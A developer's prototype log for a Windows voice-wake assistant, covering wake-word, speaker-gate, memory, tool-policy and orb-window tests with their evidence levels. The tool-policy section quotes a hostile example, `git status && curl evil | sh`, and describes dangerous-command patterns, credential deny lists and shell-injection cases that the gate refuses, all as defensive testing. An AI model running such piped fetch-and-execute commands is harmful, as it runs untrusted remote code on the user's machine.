# Prototype Results

> Started: 2026-07-22

## Validation levels (legend)

Every claim below is tagged by how it was established. Do not promote a lower level to a higher one without new evidence.

- **DOC** — documented upstream claim or checked-in report from another repo; not re-run here.
- **AUTO** — automated test / script run in this workspace's `.venv` or `desktop`, deterministic, no external hardware.
- **SIM** — simulated/synthesized input (mock transport, synthesized audio, headless browser); exercises real code paths but not real devices.
- **REAL-MIC** — real microphone on this Windows host.
- **REAL-AGENT** — a real external agent process was launched, streamed real output, and completed a turn. Mock subprocesses are SIM.
- **REAL-EVOX** — real EvoX session over the live bridge.
- **REAL-WIN** — real Tauri/WebView2 window behavior (transparency, DPI, multi-monitor, RDP).

Current status: DOC/AUTO/SIM and one REAL-MIC wake are established. REAL-AGENT, REAL-EVOX and REAL-WIN acceptance are **not yet done** and remain release blockers.

## Environment of record (2026-07-28)

- OS: Windows 11 Pro (10.0.26200). Host `.venv` Python **3.12.10**.
- Python deps: `sherpa-onnx 1.13.4`, `sherpa-onnx-core 1.13.4`, `numpy 2.5.1`, `sounddevice 0.5.5`, `soundfile 0.14.0`, `pytest 9.1.1`.
- Frontend: Node **v24.11.1**, npm **11.7.0**, TypeScript 5.6.x, Vite 8.1.x, Tauri 2.x.
- Models present under `models/`: KWS `sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01`, `silero_vad.onnx`, MeloTTS `vits-melo-tts-zh_en`.

## Reproduction commands

| Purpose | Command | Level |
|---|---|---|
| Python suite | `.venv/Scripts/python.exe -m pytest tests -q` → 169 passed, 2 skipped | AUTO |
| Memory | `.venv/Scripts/python.exe -m pytest tests/test_memory.py -q` → 62 passed | AUTO |
| Speaker gate (model-free) | `.venv/Scripts/python.exe -m pytest tests/test_speaker.py tests/test_speaker_privacy.py -q` | AUTO |
| Speaker gate (real model) | `.venv/Scripts/python.exe -m pytest tests/integration/test_speaker_model.py -q` | AUTO |
| Event + registry contracts | `.venv/Scripts/python.exe -m pytest tests/test_agent_event_schema.py -q` → 34 passed | AUTO |
| Voiceprint enrollment | `.venv/Scripts/python.exe scripts/enroll_speaker.py --name <名字>` | REAL-MIC |
| Voice smoke | `.venv/Scripts/python.exe scripts/smoke_voice.py` | SIM |
| Simulated E2E | `.venv/Scripts/python.exe scripts/e2e_simulated.py` | SIM |
| t10 stack validation | `.venv/Scripts/python.exe tmp_proto/t10_voice_stack_validation.py` | AUTO+SIM |
| TTS→VAD→KWS loop | `.venv/Scripts/python.exe tmp_proto/tts_kws_vad.py` | SIM |
| Live mic wake | `.venv/Scripts/python.exe tmp_proto/live_wake.py` | REAL-MIC |
| Orb render spike | serve `tmp_proto/orb_spike.html`, drive `window.__SPIKE__` | SIM |

## Completed

- Target workspace initially contained only the plan asset.
- Adjacent VoxCord contains the planned core, desktop shell, local wake providers, references, tests, and Windows packaging documentation.
- Its checked-in health report records 124 core tests, 14/14 desktop E2E tests, successful TypeScript checks, Windows Tauri bundle generation, local KWS readiness, and zero cloud calls for local wake tests.

## Session 2026-07-22 (plugin tools + simulated E2E)

Verified in this workspace, this session:

- `python -m pytest tests -q` → 15 passed (contract, state machine, provider adapter, session bridge, plugin tools).
- `python scripts/smoke_voice.py` → OK.
- `python scripts/e2e_simulated.py` → OK (mock transport; wake → ASR → bridge send → reply → TTS events → continuous listening → cancel → stop).
- `desktop`: `npm run build` (tsc + vite) → OK; `cargo check` on `desktop/src-tauri` → OK, zero warnings.

Implemented this session:

- Plugin tool surface: `pause`, `resume`, `wake_test` (synthetic marker), `complete_turn` (llm.delta/tts.chunk/turn.done with speaking → listening continuous-conversation transition), `devices` (optional sounddevice backend), `diagnose` (provider/bridge readiness, no credential leakage), optional `ConversationTransport` wiring in `submit_text`/`cancel`.
- Fixed an unused-import warning in `desktop/src-tauri/src/main.rs`.

Verification levels: all of the above are automated/simulated. No real microphone, no real EvoX session, no live wake model was exercised.

## Carried forward from the prior session

- Real microphone wake run in the current Windows environment.
- Live EvoX conversation bridge.
- Real streaming first-token latency.
- Separate always-on-top, skip-taskbar wake window (defined and compiling, not visually accepted).
- Fresh isolated installs of candidates other than sherpa-onnx.

## Session 2026-07-23 (isolated Sherpa provider + routines)

Verified in this workspace:

- Added `SherpaKeywordProvider` and optional `SounddeviceWakeCapture` in `core/providers.py`. Runtime imports are lazy; missing model, Sherpa, or sounddevice produces a diagnostic/unavailable result rather than breaking the plugin import path.
- Added `tests/test_sherpa_provider.py`, plugin capture lifecycle tests, and hardened bridge tests; full Python suite is now **21 passed**.
- Sherpa-ONNX `1.13.4` loads the downloaded Chinese KWS model from `models/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01`.
- Streaming 100 ms chunks ran at **RTF 0.016** on the bundled test wav; the 3-second silence control produced no hit and native inference state released cleanly.
- `python scripts/smoke_voice.py` passed.
- `python scripts/e2e_simulated.py` passed; this remains simulated and does not use a microphone or live EvoX session.
- `desktop`: `npm run build` passed.
- `desktop/src-tauri`: `cargo check` passed after `cargo clean` removed stale build artifacts containing the old path `D:\program\vioce-wake\语音唤醒对话`.
- Added [docs/routines.md](../routines.md) with repeatable commands and the appropriate trigger for each routine.
- Installed `sounddevice 0.5.5` in `.venv`; enumerated Realtek, ToDesk virtual, DirectSound, WASAPI, and WDM-KS inputs.
- Copied the MIT Silero ONNX model from the adjacent checked-out upstream package data for isolated prototyping; SHA-256 is `1a153a22f4509e292a94e67d6f9b85e8deb25b4988682b7e174c65279d8788e3`.
- Sherpa Silero VAD detected a speech segment in the bundled 8.03-second KWS wav and rejected generated silence.
- A 3-second local Realtek microphone capture completed in 3.142 seconds (`RMS 0.000044`, peak `0.001068`), produced no VAD segment in the quiet environment, saved/uploaded no audio, and released the device.
- `SounddeviceWakeCapture` and the plugin `start → pause → resume → stop` lifecycle opened and released the real microphone successfully without a wake hit in the quiet sample.
- Hardened `LocalEvoXTransport`: parsed loopback validation rejects lookalike hosts such as `localhost.evil.example`, rejects URL credentials, URL-encodes cancellation IDs, and rejects turn responses without `turn_id`.

The bundled KWS test wav produced detections for the model's test keyword file. It was not a recording of `你好问问`, so this is a runtime/pipeline verification, not yet a Chinese wake-word quality acceptance test.

## TTS download status — RESOLVED

The archive was resumed to a complete **160 MiB** file on 2026-07-23. `bzip2 -tv` passed, and it was extracted to `models/vits-melo-tts-zh_en`.

## Session 2026-07-23 (TTS → VAD → KWS closed loop)

- Silero VAD model copied from the adjacent silero-vad reference (MIT): `models/silero_vad.onnx`, SHA-256 `1a153a22f4509e292a94e67d6f9b85e8deb25b4988682b7e174c65279d8788e3`.
- Added `SherpaVadProvider` in `core/providers.py` (Silero VAD via sherpa-onnx `VoiceActivityDetector`).
- Added `tmp_proto/tts_kws_vad.py`: synthesizes `你好问问` with the MeloTTS VITS model, resamples 44.1 kHz → 16 kHz, runs VAD, then KWS.
- Verified: TTS generation 0.72 s audio (RTF ~0.3–0.49), VAD detected one 11,328-sample speech segment, **KWS hit `你好问问`** from the synthesized audio.
- SHA-256 recorded for `tts.tar.bz2` (`e58351ed…1514`) and `model.onnx` (`bf30582e…ad86d`).
- Console mojibake (`你好问问` shown as `����`) is a Windows codepage display issue only; UTF-8 bytes are correct.
- Audio capture lifecycle wired into `VoicePlugin`: `start/resume` start the capture, `pause/stop` release it, capture start failure rolls back `running` state; `diagnose()` now reports `capture_attached`.
- Python suite: **21 passed**.

## Session 2026-07-26 (real microphone wake — VERIFIED)

- Added `tmp_proto/live_wake.py`: `SounddeviceWakeCapture` + `SherpaKeywordProvider` over the Realtek mic array (device 1), 16 kHz, threshold 0.25, audio in memory only.
- Live run: spoken `你好问问` produced a wake hit at **7.193 s** with score 1.0; capture stopped and resources released; nothing saved to disk.

## Session 2026-07-28 (t10 consolidated voice-stack validation + suite hygiene)

Environment: this workspace's isolated `.venv`, Windows, Python 3.12.10, sherpa-onnx 1.13.4, numpy 2.5.1, sounddevice 0.5.5, soundfile 0.14.0.

Suite hygiene:

- Installed `pytest 9.1.1` into `.venv` (previously missing, which blocked the documented `python -m pytest tests -q`).
- Gated the two `VoxCordAdapter` tests in `tests/test_provider_adapter.py` with `pytest.mark.skipif` when the adjacent VoxCord checkout is absent (it is not present on this host). They now **skip** instead of failing.
- `python -m pytest tests -q` → **19 passed, 2 skipped** (VoxCord optional).
- `python scripts/smoke_voice.py` → OK. `python scripts/e2e_simulated.py` → OK (17 events, 2 bridge sends, 1 cancel; mock transport).

t10 harness (`tmp_proto/t10_voice_stack_validation.py`) — release-path core sherpa-onnx, all checks passed:

| Check | Result | Evidence level |
|---|---|---|
| Windows startup + model load | KWS 0.627 s, VAD 0.053 s, both available | real local model load |
| Local Chinese wake on synth `你好问问` | hit; TTS gen 0.235 s; decode 0.026 s (RTF ~0.002) | synthesized audio, not a live mic recording |
| Resource release (8× open/close cycles) | python peak growth 0.01 MB, no leak | automated |
| Continuous run (12 s / 120 chunks silence) | 0 spurious hits, RTF 0.0186 | automated |
| Swappable conversation backend | two distinct transports drive identical turn path | automated (mock transports) |
| Interruptible TTS / barge-in | cancel during `speaking` → `turn.cancelled`, transport told to cancel pending turn, clean return to idle | automated (mock transport) |

Verification level: automated + synthesized audio. This is **not** a live-microphone or live-EvoX acceptance; those remain in the "Not yet verified" list below. The swappable-backend and barge-in checks use mock transports, confirming the plugin/turn orchestration is backend-agnostic and interruptible at the contract level.

## Session 2026-07-28 (t11 orb render-route spike)

Isolated UI prototype `tmp_proto/orb_spike.html` served over `python -m http.server 8791` and driven headlessly (Chromium via CDP, DPR 1). It carries all three candidate render routes behind a `window.__SPIKE__` API with `measure(route, ms)`, `setAmplitude`, and `glSupported()` hooks.

| Route | FPS (2 s window) | Render | Verdict |
|---|---:|---|---|
| CSS-only (degradation baseline) | 239.8 | conic-gradient core + blur, no raster canvas | **direct adopt** as degraded/static tier |
| Canvas 2D + rings (v1 main path) | 239.9 | radial glow + 3 amplitude-driven wave rings, clean, deterministic | **direct adopt** as v1 primary |
| WebGL shader (v2 option) | 240.0 | fragment-shader glow + concentric ring interference, richer | **v2 upgrade path**, GPU/driver dependent |

Additional evidence captured this run:

- WebGL: `glSupported() === true`, no compile/link error on this host; screenshot shows shader ring interference distinct from the Canvas route.
- Amplitude clamp verified: input `[0, 0.5, 1, 0.5, 0]` → clamped `[0.12, 0.5, 1, 0.5, 0.12]` (floor 0.12, ceil 1.0).
- Degradation signals all queryable: `matchMedia('(prefers-reduced-motion: reduce)')`, `navigator.hardwareConcurrency` (32), Canvas 2D context, WebGL context, `devicePixelRatio` — this is the full input set the quality-tier selector (t31) needs.
- Zero console errors across all three routes; screenshots captured for CSS, Canvas 2D, and WebGL.

Verification level: automated + headless Chromium visual capture. **Not** verified here: transparent-window compositing inside the real WebView2 runtime, true Windows DPI scaling at 125%/150%/175%, GPU load under sustained animation, and remote-desktop (RDP) software-render fallback. Those require the actual Tauri window and remain Phase 6 / t53 acceptance items. The spike confirms the plan's chosen architecture (Canvas 2D primary + CSS degradation + WebGL as v2) is technically sound at the render-route level before committing the production renderer files (t28–t35).

## Session 2026-08-02 (P1 speaker gate — measured on real speech)

Model: `models/3dspeaker_speech_eres2net_base_sv_zh-cn_3dspeaker_16k.onnx`, 39,593,761 bytes, SHA-256 `1a331345f04805badbb495c775a6ddffcdd1a732567d5ec8b3d5749e3c7a5e4b`, embedding **dim 512**. Loaded through the already-installed sherpa-onnx 1.13.4 — **zero new Python dependency**, confirmed by return value (`load()` → `available=True`), not by absence of an exception.

### Cosine separation on the 7 bundled KWS wavs — AUTO

The recordings in `models/sherpa-onnx-kws-zipformer-wenetspeech-3.3M-2024-01-01/test_wavs/` are real human speech (3.55–8.03 s each). No speaker labels ship with them; the grouping below was **derived from** the score matrix, then used to state the separation:

| Pair | Score | Pair | Score |
|---|---:|---|---:|
| 0–1 | 0.777 | 0–3 | −0.074 |
| 0–2 | 0.813 | 0–4 | 0.027 |
| 1–2 | **0.866** | 1–5 | −0.105 |
| 3–4 | **0.736** | 2–6 | −0.039 |
| 5–6 | 0.755 | 3–5 | 0.270 |
| | | 4–6 | 0.346 |
| | | 4–5 | **0.370** |

Three clusters: {0,1,2}, {3,4}, {5,6}. Within-cluster minimum **0.736**; cross-cluster maximum **0.370**. The shipped default `threshold = 0.5` sits inside that gap with ≈0.24 margin below and ≈0.13 above. Enrolling wav 0 then admits 1 and 2 and refuses 3, 4, 5, 6 — asserted in `tests/integration/test_speaker_model.py`.

**Evidence level is AUTO, not REAL-MIC.** The audio is real speech but recorded and pre-existing. What this establishes: the model discriminates, and 0.5 is a defensible default. What it does **not** establish: own-voice pass rate on this host's microphone, another person's rejection rate, or replay behaviour. All three still need P10 (release blocker #8).

### Negative result: synthetic audio cannot test discrimination — AUTO

Enrolled a 120 Hz harmonic stack (7 partials + noise), verified a 240 Hz one — an octave apart, about as different as two synthetic signals get. Result: **accepted, score 0.767**. The model is trained on speech and reads both as the same non-voice. Any discrimination test built on generated tones would pass vacuously; `test_synthetic_tones_cannot_stand_in_for_speech` pins this so the trap stays documented rather than rediscovered.

### KWS exposes no confidence — finding, corrects FR-1.8

`sherpa_onnx.lib._sherpa_onnx.KeywordResult` carries only `keyword`, `timestamps`, `tokens`, and `KeywordSpotter.get_result()` returns a bare `str`. There is **no per-hit confidence in this binding at all**. The previous code reported `1.0`, which read like a measurement and was not one — including in the 2026-07-26 REAL-MIC entry above, where "score 1.0" was that constant, not a detector output. `feed()` now returns `(keyword, None)`, and the number that reaches `wake.detected` is the speaker cosine similarity, which *is* measured. See ADR 002.

### Implemented and verified this session

- `core/audio/ring.py` — 3 s in-memory ring buffer (~192 KB @16 kHz float32). Red line 1's literal enforcement point: an AST test asserts the module imports nothing beyond `numpy`/`typing` and references no filesystem, socket, or subprocess name.
- `core/audio/capture.py` — gate wired at the KWS hit (ADR 002 option A). Preconditions checked **before** the device opens; every fail-closed branch raises.
- `core/audio/speaker.py` — `load_speaker_config()` + `from_config()` over `config/speaker.toml` via stdlib `tomllib`. Paths deliberately stay on environment variables so a checked-in config can never point at somebody's enrollment data.
- `evox_plugin/plugin.py` — `wake_rejected()` (no state transition, no reply) and `_diagnose_speaker()` (names and counts only, never a vector; explicit `warnings` when the gate is off).
- `scripts/enroll_speaker.py` — interactive Chinese-prompted enrollment, append-only, audio never written anywhere.
- Suite: **67 passed, 2 skipped** (was 43 at the end of P0; 19 privacy/fail-closed tests plus 5 model-gated integration tests added).

Fail-closed paths asserted individually: model missing → `start()` raises; nobody enrolled → raises; no verifier attached but verification required → raises; verifier throws mid-decision → rejection, not a pass; score below threshold → silent rejection with no state change. A full gate cycle inside a `tmp_path` CWD leaves the directory **empty**.

## Session 2026-08-02 (P2 platform event contract — AUTO)

Two contracts, one envelope. Measured on the committed files:

| Fact | Measured value |
|---|---|
| `contracts/voice-events.schema.json` | 575 bytes, SHA-256 `4f60b6124dcb9704624a0606f411981d0bf572de22fcf4a25fad133bd3c75de5`, 9 types, version `"1"` |
| `contracts/agent-events.schema.json` | 880 bytes, 12 types (`task.*` 4 / `agent.*` 2 / `tool.*` 4 / `memory.*` 2) |
| `contracts/agents.schema.json` | 1,294 bytes, registry shape for `config/agents.toml` |
| `core/events.py` | 138 lines (was 93): `+ AGENT_SCHEMA_PATH`, `CONTRACT_PATHS`, `contract_for()`, `validate_any_event()` |
| `core/agents/schema.py` | 146 lines, hand-rolled subset validator |
| `tests/test_agent_event_schema.py` | 274 lines, **34 passed** |
| Suite | **101 passed, 2 skipped** in 13.04 s, 103 collected (was 67 at the end of P1) |
| New runtime dependency | **none** — `import jsonschema` in the `.venv` raises `ImportError`, checked, so both validators stay hand-rolled |

Three properties are now enforced rather than intended:

- **NFR-5.8 is a digest, not an intention.** `test_voice_contract_is_byte_identical` fails on any in-place edit of the voice contract and its assertion message says where platform events belong instead.
- **The two envelopes are interchangeable.** Same `required` set, same property set, same `version` const, both `additionalProperties: false` — and the two `type` enums are **disjoint**, which is what keeps `contract_for()` from being ambiguous. Both are asserted; a type declared by two contracts raises rather than silently first-matching.
- **The registry schema cannot over-declare.** `test_the_schema_stays_inside_the_validator_subset` walks every key in `agents.schema.json` and fails on any keyword the validator does not implement, because a declared-but-inert constraint reads as protection. `kind`'s enum is asserted equal to `AGENT_KINDS` for the same reason: a config that validates and then fails at adapter construction is the worst of the two failure modes.

Not established by this session: any platform event has an actual producer. All 12 types are declared and validated; `memory.*` gets one in P3, `tool.*` in P4, `task.*`/`agent.*` in P6. `config/agents.toml` does not exist yet either — only its shape does.

## Session 2026-08-02 (P3 memory — AUTO)

The measurement that decided the design, taken **before** any of it was written, in this `.venv`:

| Fact | Measured value |
|---|---|
| SQLite version / FTS5 | **3.49.1**, `ENABLE_FTS5` present in `PRAGMA compile_options` |
| `MATCH 'english'` against a row holding 「用户喜欢用中文交流 and english too」 | **1 hit** |
| `MATCH '中文'` against the same row | **0 hits** — `unicode61` treats the whole CJK run as one token |
| ICU tokenizer available | **no** (would be a new native dependency) |

So the FTS table indexes a derived token column instead of the text: index side = every CJK character plus every overlapping bigram, query side = bigrams only. Dropping single characters from the query side is what stops 「偏好」 matching a record that merely contains 「好」. Recall is two-stage — strict AND, then a bm25-ranked OR fallback only when strict comes back empty.

| Fact | Measured value |
|---|---|
| `core/memory/store.py` | 501 lines — schema, FTS5, tokenizers, config loading |
| `core/memory/write.py` | 359 lines — credential filter, dedup, Markdown mirror |
| `core/memory/recall.py` | 144 lines — match expression, two-stage recall, `MemoryRecaller` |
| `core/memory/__init__.py` | 89 lines — `open_memory()` returns the three collaborators as a tuple |
| `config/memory.toml` | 23 lines — `db_path`, `facts_dir`, `recall_limit = 8`, `short_keep = 200` |
| `records` column types | `TEXT` / `INTEGER` only — **no BLOB**, so audio has no column to land in |
| Credential samples refused whole | **9/9**, `store.count() == 0`, no event emitted, no copy in `last_refusal` |
| Ordinary sentences falsely refused | **0/5** (including 「我的密码忘了怎么办」 and 「token 是什么意思」) |
| Database footprint | one file plus SQLite's own `-wal` / `-shm` / `-journal` |
| `tests/test_memory.py` | 579 lines, **62 passed** in 0.69 s |
| `tests/test_plugin_tools.py` | 214 lines, **16 passed** (10 before, 6 for the memory wiring) |
| Suite | **169 passed, 2 skipped** in 13.78 s, 171 collected (was 101 at the end of P2) |
| New runtime dependency | **none** — `sqlite3` ships with CPython |

Four choices are worth recording because the obvious alternative was wrong:

- **De-duplication is a schema constraint, not writer discipline.** A partial unique index on `(scope, kind, fingerprint) WHERE scope = 'mid'` means only facts collapse. Turns and audit rows are a time series: two identical utterances are two events, and the long layer exists precisely to keep that history.
- **Credential-shaped text is refused whole, never redacted.** A multi-line private key is the deciding case — a pattern matches the header, and redaction would store the body.
- **Memory events carry no text.** An event fans out to every log and transport; ids, counts, scope and tags are enough for `diagnose()` to answer "did that get remembered" without the payload becoming a second copy of the store.
- **The gitignore pattern is anchored.** Measured, not reasoned about: `git check-ignore -v core/memory/store.py` reported `.gitignore:20:memory/`, and `git status --short` did not list the three new implementation files at all. A gitignore pattern without a leading slash matches at *any* depth, so the line meant to keep the user's personal store out of the repository was also hiding the store's source code — `__init__.py` and `contract.py` were visible only because they were already tracked. `/memory/` fixes it; a test parses `.gitignore` and asserts both directions so it cannot come back.

Not established by this session: cross-process persistence. Every Markdown round trip measured above happens inside one process. "Close the program, open it again, the fact is still there" is release blocker 11, level REAL. `prune_turns()` also has no caller yet, so the short layer does not self-trim, and `MemoryRecaller`'s output has no consumer until the dispatcher lands in P6.

## Session 2026-08-02 (P4 local tools + policy gate — AUTO)

The gate was written before any tool that needs it, and the refusal matrix was written as a separate file from the behaviour tests. That split paid for itself immediately — see the defect below.

| Fact | Measured value |
|---|---|
| `core/tools/policy.py` | 345 lines — config loader, sandbox resolution, 13 dangerous patterns, env scrub, `DefaultToolPolicy` |
| `core/tools/runner.py` | 171 lines — the single funnel: gate → tool → `tool.*` events → audit row |
| `core/tools/web.py` / `shell.py` / `fs.py` / `contract.py` / `__init__.py` | 120 / 115 / 76 / 80 / 85 lines (992 total for the package) |
| `config/tools.toml` | 53 lines, `[shell] enabled = false` as shipped |
| `evox_plugin/plugin.py` | 413 lines (was 326): `attach_tools()`, `run_tool()`, `diagnose()["tools"]` |
| `tests/test_tools.py` | 460 lines, **35 passed** |
| `tests/test_tool_security.py` | 555 lines, **89 collected — 88 passed, 1 skipped** |
| Both tool files together | **123 passed, 1 skipped in 0.48 s** |
| `tests/test_plugin_tools.py` | 331 lines, **24 passed** (16 before, 8 for the tool wiring) |
| Suite | **300 passed, 3 skipped** in 14.31 s, 303 collected (was 169 at the end of P3) |
| New runtime dependency | **none** — `shlex`, `subprocess`, `tomllib`, `urllib.parse` all ship with CPython |

### Latency of the fast path — AUTO

| Path | Median | Note |
|---|---:|---|
| `fs.read` of a 4 KB file, end to end | **0.64 ms** | gate + read + two events + audit row, 200 iterations |
| A refused request | **0.34 ms** | sandbox escape, refused before touching the filesystem |

NFR-1.10 targets < 50 ms for the rule-hit local-tool path. The tool half has two orders of magnitude of headroom; the rule-classification segment in front of it does not exist yet (P6), so the **whole** path remains unmeasured.

### A real defect, found by a test — `confirmed` was truthy, not identical

`_check_shell_run` originally read `not request.arguments.get("confirmed", False)`. A JSON body of `{"command": "git status", "confirmed": "no"}` therefore **executed the command**: `"no"` is a truthy string. Fixed in both places that check it (`policy.py` and `shell.py`) with `is not True`, and the four values `0` / `""` / `None` / `"no"` are now asserted to still require confirmation.

This is the argument for writing the refusal matrix as its own file: every positive test still passed with the hole open. A confirmation flag a stray string can set is not a confirmation flag.

### What the 89 refusal cases actually cover

Unknown tool / unknown origin / disabled section; four traversal shapes plus an absolute path plus a symlink; six credential filenames; two `denied_dirs` (`enrollment/`, `memory/`); the shipped deny list asserted in both directions; `shell.run` off by default; an off-allowlist command refused **with `needs_confirmation is False`**; token-prefix rather than string-prefix matching (`git status` must not admit `git statuses`); no verified speaker; agent origin blocked structurally; **all 13 dangerous patterns, each named**, plus a coverage test asserting the sample table's keys equal `DANGEROUS_PATTERNS`' names so a 14th pattern cannot be added untested; eight smuggling attempts behind an allowlisted prefix (`;` `&&` `|` backtick `$()` `>` `>>` newline); an unbalanced quote; `dangerous_patterns` rejected as a config key; env scrubbing; events carrying no content; the gate's warnings.

The check order is deliberate and asserted: command present → dangerous shape → allowlist → verified speaker → confirmation. Shape before allowlist is why `git status && curl evil | sh` dies before it can be mistaken for a permitted prefix, and it is also why a blocked command never reaches the orb as a *pending* action.

### Four limits, recorded rather than smoothed over

- **The symlink-escape case skips on this account** — `Path.symlink_to` raises without the privilege, which is the Windows default. `resolve_in_sandbox` resolving before comparing is asserted directly as a unit property, but the end-to-end escape is unproven on this host.
- **`web.search` has never talked to a real backend.** Every case injects a fake. Normalisation (title / URL / snippet, blocklist, result cap) is proven; integration with a real provider is not, and cannot be until one is chosen — and choosing one means a cloud key, which red line 1 forbids by default.
- **`shell.run` has only ever executed `git --version`.** Timeout, output cap, and cwd behaviour are exercised on that one command. The confirmation *flow* — orb display, user action, resubmission — is not implemented at all; it is P8 and REAL-WIN.
- **The audit trail depends on the memory layer being attached.** With no writer, decisions are still counted and emitted as events but nothing persists. `describe()["audit_attached"]` is how the user tells the two apart.

Not established by this session: anything calls a tool automatically. `VoicePlugin.run_tool()` is the only entry point and it is opt-in; rule-based intent classification ("读一下 X" → execute directly) is P6. The plugin also supplies no verified speaker of its own, so `shell.run` through the plugin is always refused — correct until the dispatcher threads the name through.

## Session 2026-08-11 (P8 wake orb shell — AUTO + SIM)

Frontend `npm run build` (tsc + vite) clean; `cargo check --all-targets` clean with **zero warnings**; `cargo test` **8 passed** on the hit-region geometry.

**Selective click-through is polled, not hit-tested by the OS.** Tauri 2's `set_ignore_cursor_events` is an all-or-nothing window flag — there is no Electron `forward: true` equivalent, and once it is set the webview stops receiving `mouseenter`/`mouseleave` at all, so the webview cannot detect its own hover (tauri#6164, 社区来源 — GitHub WebFetch is blocked on this host, so this may not be cited as 官方确认). A 30 ms Rust-side cursor poll compares the cursor against a region **the frontend measures and reports**, and toggles the flag only on transitions.

**Geometry is owned by the frontend on purpose.** The circle's centre and radius are outputs of CSS layout; anything hardcoded in Rust drifts the moment a style changes, and the symptom of drift — "the orb won't click" or "clicks land on empty space" — is expensive to diagnose. `measureHitRegion()` walks `offsetLeft`/`offsetTop` (the **layout** box, not `getBoundingClientRect()`, which would include the per-frame float/breathe `transform` and re-fire IPC every frame) and reports logical CSS pixels; Rust converts the physical cursor into the same space via `(cursor - inner_position) / scale_factor`.

SIM (12/12) — the reported region translated into logical coordinates, fed through the same predicate as `main.rs`:

| case | expect |
|---|---|
| 折叠 orb centre / edge-inside (169.9) | hit |
| 折叠 edge-outside (171) / above / left / bottom-right blank | pass through |
| 展开 orb centre / panel interior / panel bottom-right corner | hit |
| 展开 gap between circle and panel / left of panel / below panel | pass through |

The gap cases are the point of the whole design: a naive bounding box would leave an invisible ~200 px square eating desktop clicks around a 148 px circle.

**Failure paths deliberately fail *open* (window eats the mouse).** If the cursor read, window position, or scale factor fails, or no region has been reported yet, the region is treated as "inside". The reverse looks politer but turns the tool-confirmation card into an un-clickable picture, and a confirmation nobody can click is equivalent to no confirmation. A ~200 px square blocking the desktop is recoverable; a dead Allow button is not.

Also closed this session: `.shadow(false)` (a transparent undecorated Windows window otherwise draws a rectangular grey halo that tracks the orb), window size following the reported content box clamped into `monitor.work_area()`, drag via an own `evox_start_drag` command behind a 4 px threshold (with the OS-synthesised trailing `click` swallowed only when `event.detail > 0`, so keyboard activation still fires), and runtime show/hide via `evox_set_visible` — which settles any pending confirmation as **denied** and collapses the panel before hiding.

**No capabilities file, deliberately.** Tauri 2 checks the ACL only for `plugin:`-prefixed commands or when the app ships its own ACL manifest (`tauri-2.10.3` `webview/mod.rs:1802`; the generated `acl-manifests.json` has no `app` key). Shipping none is the tightest posture available: every `core:*` plugin command is unreachable from the webview and the entire IPC surface is the three `evox_*` commands. The cost is that the frontend must never `import` `@tauri-apps/api` — it calls `__TAURI_INTERNALS__.invoke` directly and degrades silently to a no-op in a browser, which is what makes the SIM tests above runnable at all.

CSP widened to `default-src 'self'; style-src 'self' 'unsafe-inline'; connect-src ipc: http://ipc.localhost`. Without it IPC still works — `ipc-protocol.js` falls back from `fetch` to `window.ipc.postMessage` — but logs a warning on the first invoke.

**Nothing here is REAL-WIN.** `cargo check` is AUTO and the click-through table is SIM. Whether the click-through actually feels right, whether the shadow is really gone, whether drag tracks the cursor, and whether the DPI conversion holds at 125% / 150% / 175% all need the window on screen (发布阻塞项 #5).

## Not yet verified

- Speaker gate on this host's microphone: own-voice pass rate, another person's rejection, recorded-replay behaviour (the gate does **not** claim replay resistance — ADR 002 「局限」).
- Spoken real-microphone Silero endpointing acceptance (device opening and quiet-input rejection are verified).
- Live EvoX conversation bridge.
- Real streaming first-token latency.
- Separate always-on-top, skip-taskbar wake window (defined and compiling, not visually accepted).
- Wake-orb click-through, shadow suppression, drag, and DPI conversion at 125% / 150% / 175% — all SIM/AUTO only, REAL-WIN pending (P10).
- The Python→desktop event path. `main.rs` has no `emit` and the frontend listens to DOM `CustomEvent`s; nothing in Python drives the orb yet.

## Blockers

1. Build a separate-window visual spike before copying audio components.
2. Define and verify the live EvoX session bridge.

License note (2026-07-26): the user confirmed VoxCord is their own independent project, so the distribution-license blocker is resolved and selective reuse is permitted.
